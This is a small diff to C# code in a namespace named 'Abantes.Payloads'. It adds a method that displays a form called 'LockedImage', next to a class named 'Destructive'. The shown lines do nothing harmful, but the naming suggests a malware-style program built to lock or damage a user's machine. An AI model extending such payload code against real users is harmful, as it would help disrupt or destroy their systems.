@@ -96,6 +96,11 @@ namespace Abantes.Payloads
                 Thread.Sleep(400);
             }
         }
+        public static void LockedImage()
+        {
+            Form Image = new LockedImage();
+            Image.Show();
+        }
     }
     class Destructive
     {
